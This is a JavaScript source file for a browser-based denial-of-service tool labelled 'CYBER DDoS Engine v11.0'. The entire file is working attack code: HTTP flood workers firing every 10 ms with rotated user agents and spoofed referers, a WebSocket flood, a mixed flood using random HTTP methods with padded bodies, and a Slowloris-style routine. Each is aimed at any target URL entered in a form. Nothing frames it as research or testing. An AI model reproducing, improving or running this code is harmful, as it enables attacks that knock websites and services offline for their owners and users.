// CYBER DDoS Engine v11.0
class DDoSAttack {
    constructor() {
        this.attacking = false;
        this.requestsSent = 0;
        this.successCount = 0;
        this.errorCount = 0;
        this.workers = [];
        this.attackInterval = null;
        this.startTime = null;
        this.duration = 0;
        
        // User agents for rotation
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ];
        
        this.init();
    }
    
    init() {
        // Update threads value display
        const threadsSlider = document.getElementById('threads');
        const threadsValue = document.getElementById('threadsValue');
        
        threadsSlider.addEventListener('input', function() {
            threadsValue.textContent = this.value;
        });
        
        // Load saved settings
        this.loadSettings();
    }
    
    log(message, type = 'info') {
        const statusDiv = document.querySelector('.status');
        const logEntry = document.createElement('div');
        logEntry.className = `log ${type}`;
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        
        statusDiv.appendChild(logEntry);
        statusDiv.scrollTop = statusDiv.scrollHeight;
        
        // Also log to terminal
        this.terminalLog(message);
    }
    
    terminalLog(message) {
        const terminal = document.getElementById('terminal');
        const entry = document.createElement('div');
        entry.textContent = `> ${message}`;
        terminal.appendChild(entry);
        terminal.scrollTop = terminal.scrollHeight;
    }
    
    updateStats() {
        document.getElementById('requests').textContent = this.requestsSent;
        document.getElementById('success').textContent = this.successCount;
        document.getElementById('errors').textContent = this.errorCount;
    }
    
    updateProgress(percent) {
        const progressBar = document.getElementById('progress');
        progressBar.style.width = `${percent}%`;
    }
    
    getRandomUserAgent() {
        return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }
    
    // HTTP Flood Attack
    httpFlood(target, threads, duration) {
        this.log(`Starting HTTP Flood with ${threads} threads`, 'warning');
        
        for(let i = 0; i < threads; i++) {
            const worker = setInterval(async () => {
                if(!this.attacking) return;
                
                try {
                    const userAgent = this.getRandomUserAgent();
                    const referer = document.getElementById('referer').value || 'http://google.com';
                    
                    const response = await fetch(target, {
                        method: 'GET',
                        mode: 'no-cors',
                        headers: {
                            'User-Agent': userAgent,
                            'Referer': referer,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1'
                        }
                    });
                    
                    this.requestsSent++;
                    this.successCount++;
                } catch(error) {
                    this.requestsSent++;
                    this.errorCount++;
                }
                
                this.updateStats();
            }, 10); // 100 requests per second per thread
            this.workers.push(worker);
        }
    }
    
    // WebSocket Flood (for WebSocket servers)
    websocketFlood(target, threads) {
        this.log(`Starting WebSocket Flood`, 'warning');
        
        for(let i = 0; i < threads; i++) {
            try {
                const ws = new WebSocket(target.replace('http', 'ws'));
                
                ws.onopen = () => {
                    const worker = setInterval(() => {
                        if(!this.attacking) {
                            ws.close();
                            clearInterval(worker);
                            return;
                        }
                        
                        ws.send(JSON.stringify({
                            type: 'ping',
                            data: 'A'.repeat(1024),
                            timestamp: Date.now()
                        }));
                        
                        this.requestsSent++;
                        this.successCount++;
                        this.updateStats();
                    }, 100);
                    this.workers.push(worker);
                };
                
                ws.onerror = () => {
                    this.errorCount++;
                    this.updateStats();
                };
            } catch(error) {
                this.errorCount++;
                this.updateStats();
            }
        }
    }
    
    // Mixed Attack (Combines methods)
    mixedAttack(target, threads, duration) {
        this.log(`Starting Mixed Attack`, 'warning');
        
        // Start HTTP flood
        this.httpFlood(target, Math.floor(threads / 2), duration);
        
        // Add WebSocket flood if target supports it
        setTimeout(() => {
            if(this.attacking) {
                this.websocketFlood(target, Math.floor(threads / 4));
            }
        }, 5000);
        
        // Add fetch requests with different methods
        const methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD'];
        
        for(let i = 0; i < Math.floor(threads / 4); i++) {
            const worker = setInterval(async () => {
                if(!this.attacking) return;
                
                try {
                    const method = methods[Math.floor(Math.random() * methods.length)];
                    await fetch(target, {
                        method: method,
                        mode: 'no-cors',
                        headers: {
                            'User-Agent': this.getRandomUserAgent(),
                            'Content-Type': 'application/json'
                        },
                        body: method === 'GET' || method === 'HEAD' ? null : JSON.stringify({
                            data: 'A'.repeat(1000),
                            timestamp: Date.now()
                        })
                    });
                    
                    this.requestsSent++;
                    this.successCount++;
                } catch(error) {
                    this.requestsSent++;
                    this.errorCount++;
                }
                
                this.updateStats();
            }, 50);
            this.workers.push(worker);
        }
    }
    
    // Slowloris Attack (Resource exhaustion)
    slowlorisAttack(target, threads) {
        this.log(`Starting Slowloris Attack`, 'warning');
        
        const sockets = [];
        
        // Create many connections and keep them open
        for(let i = 0; i < threads; i++) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', target, true);
                
                // Send initial headers
                xhr.setRequestHeader('User-Agent', this.getRandomUserAgent());
                xhr.setRequestHeader('X-a', Math.random().toString(36).substring(7));
                
                xhr.send();
                sockets.push(xhr);
                
                // Periodically send more headers to keep connection alive
                const keepAlive = setInterval(() => {
                    if(!this.attacking) {
                        clearInterval(keepAlive);
                        return;
                    }
                    
                    try {
                        xhr.setRequestHeader('X-keep-alive', Math.random().toString(36).substring(7));
                    } catch(e) {}
                }, 15000);
                
                this.workers.push(keepAlive);
                
            } catch(error) {
                this.errorCount++;
                this.updateStats();
            }
        }
    }
    
    startAttack() {
        const target = document.getElementById('target').value;
        const port = document.getElementById('port').value;
        const method = document.getElementById('method').value;
        const threads = parseInt(document.getElementById('threads').value);
        this.duration = parseInt(document.getElementById('duration').value) * 1000; // Convert to ms
        
        if(!target) {
            this.log('Error: Please enter a target', 'error');
            return;
        }
        
        // Validate target URL
        let targetUrl = target;
        if(!target.startsWith('http')) {
            targetUrl = `http://${target}`;
        }
        
        if(port && port !== '80') {
            targetUrl = targetUrl.replace(/:\d+/, `:${port}`);
        }
        
        this.attacking = true;
        this.startTime = Date.now();
        this.requestsSent = 0;
        this.successCount = 0;
        this.errorCount = 0;
        
        this.log(`🚀 Attack launched on ${targetUrl}`, 'success');
        this.log(`Method: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${this.duration/1000}s`, 'info');
        
        // Start selected attack method
        switch(method) {
            case 'http':
                this.httpFlood(targetUrl, threads, this.duration);
                break;
            case 'mixed':
                this.mixedAttack(targetUrl, threads, this.duration);
                break;
            case 'slowloris':
                this.slowlorisAttack(targetUrl, threads);
                break;
            default:
                this.httpFlood(targetUrl, threads, this.duration);
        }
        
        // Update progress bar
        this.attackInterval = setInterval(() => {
            if(!this.attacking) return;
            
            const elapsed = Date.now() - this.startTime;
            const percent = Math.min((elapsed / this.duration) * 100, 100);
            this.updateProgress(percent);
            
            if(elapsed >= this.duration) {
                this.stopAttack();
                this.log('Attack completed (time limit reached)', 'info');
            }
        }, 1000);
        
        this.updateStats();
    }
    
    stopAttack() {
        this.attacking = false;
        
        // Clear all workers
        this.workers.forEach(worker => {
            if(typeof worker === 'number') {
                clearInterval(worker);
            }
        });
        this.workers = [];
        
        if(this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        this.log('Attack stopped', 'error');
        this.updateProgress(0);
    }
    
    saveSettings() {
        const settings = {
            target: document.getElementById('target').value,
            port: document.getElementById('port').value,
            method: document.getElementById('method').value,
            threads: document.getElementById('threads').value,
            duration: document.getElementById('duration').value,
            proxy: document.getElementById('proxy').value,
            useragent: document.getElementById('useragent').value,
            referer: document.getElementById('referer').value,
            payload: document.getElementById('payload').value
        };
        
        localStorage.setItem('cyber_ddos_settings', JSON.stringify(settings));
        this.log('Settings saved successfully', 'success');
    }
    
    loadSettings() {
        const saved = localStorage.getItem('cyber_ddos_settings');
        if(saved) {
            const settings = JSON.parse(saved);
            
            document.getElementById('target').value = settings.target || '';
            document.getElementById('port').value = settings.port || '80';
            document.getElementById('method').value = settings.method || 'http';
            document.getElementById('threads').value = settings.threads || '100';
            document.getElementById('duration').value = settings.duration || '60';
            document.getElementById('proxy').value = settings.proxy || 'false';
            document.getElementById('useragent').value = settings.useragent || 'random';
            document.getElementById('referer').value = settings.referer || '';
            document.getElementById('payload').value = settings.payload || '';
            
            document.getElementById('threadsValue').textContent = settings.threads || '100';
            
            this.log('Settings loaded from storage', 'info');
        }
    }
}

// Initialize DDoS engine
const ddos = new DDoSAttack();

// Global functions for button clicks
function startAttack() {
    ddos.startAttack();
}

function stopAttack() {
    ddos.stopAttack();
}

function saveSettings() {
    ddos.saveSettings();
}

// Auto-save settings on change
document.querySelectorAll('input, select, textarea').forEach(element => {
    element.addEventListener('change', () => {
        ddos.saveSettings();
    });
});